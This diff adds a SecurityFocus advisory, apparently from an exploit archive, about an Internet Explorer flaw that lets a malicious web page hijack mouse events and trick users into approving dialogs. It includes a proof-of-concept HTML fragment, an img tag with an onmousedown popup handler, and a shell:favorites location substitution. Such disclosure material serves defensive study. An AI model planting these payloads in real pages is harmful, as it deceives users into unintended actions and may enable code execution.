@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/10690/info
+
+A vulnerability exists in Microsoft Internet Explorer that may permit a malicious Web page to hijack mouse events. This could potentially be exploited to trick an unsuspecting user into performing unintended actions such as approving pop-up dialogs.
+
+The method caching variant of this attack is also reported to work.
+
+
+This issue could potentially be exploited to execute arbitrary code or be used in other attacks.
+
+A variant of this proof of concept has been supplied by http-equiv:
+Just substitute the following:
+1. <img src="greyhat.html" id=anch
+onmousedown="parent.nsc.style.width=2000;parent.nsc.style.height=
+2000;parent.pop.show(1,1,1,1);parent.setTimeout('showalert
+()',3000);" style="width=168px;height=152px;background-image:url
+('youlickit.gif');cursor:hand" title="click me!"></a>
+
+2. location="shell:favorites\\greyhat[1].htm"
